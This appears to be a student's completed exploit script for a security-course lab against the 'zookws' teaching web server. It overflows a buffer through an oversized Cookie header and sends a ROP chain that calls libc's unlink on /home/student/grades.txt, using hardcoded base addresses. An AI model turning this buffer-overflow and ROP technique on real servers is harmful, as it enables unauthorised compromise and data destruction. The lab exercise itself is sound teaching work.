#!/usr/bin/env python3
import sys
import socket
import traceback
import urllib.parse
import struct

####

## You might find it useful to define variables that store various
## stack or function addresses from the zookd / zookfs processes,
## which you can then use in build_exploit(); the following are just
## examples.

#stack_buffer = 0x34567890
#stack_retaddr = 0x12345678

program_base = 0x555555554000
libc_base = 0x155554f3b000

def p64(n):
    return struct.pack("<Q", n)

def urlencode(b):
    r = b""
    for c in b:
        r += b"%"+c.to_bytes(1,"little").hex().encode()
    return r

## This is the function that you should modify to construct an
## HTTP request that will cause a buffer overflow in some part
## of the zookws web server and exploit it.

def build_exploit(shellcode):
    ## Things that you might find useful in constructing your exploit:
    ##
    ##   urllib.parse.quote_from_bytesquote(s).encode('ascii')
    ##     returns string s with "special" characters percent-encoded
    ##   struct.pack("<Q", x)
    ##     returns the 8-byte binary encoding of the 64-bit integer x

    unlink_addr = libc_base + 0x111d40
    pop_rdi_ret = program_base + 0x2fb3

    filename = b"/home/student/grades.txt"
    filename_addr = program_base + 0x208040 + 768

    rop_payload = p64(pop_rdi_ret) + \
            p64(filename_addr) + \
            p64(unlink_addr)

    buf = b"Cookie: "+ \
            b"a"*(0x230+8) + \
            urlencode(rop_payload)

    assert(len(buf) <= 768)
    buf = buf.ljust(768, b"b")
    buf += filename + b"\0"

    req =   b"GET / HTTP/1.0\r\n" + \
            buf + \
            b"\r\n\r\n"
    return req

####

def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = b""

    while len(rbuf):
        resp = resp + rbuf
        rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp

####

if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    shellfile = open("shellcode.bin", "rb")
    shellcode = shellfile.read()
    req = build_exploit(shellcode)
    print("HTTP request:")
    print(req)

    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except:
    print("Exception:")
    print(traceback.format_exc())

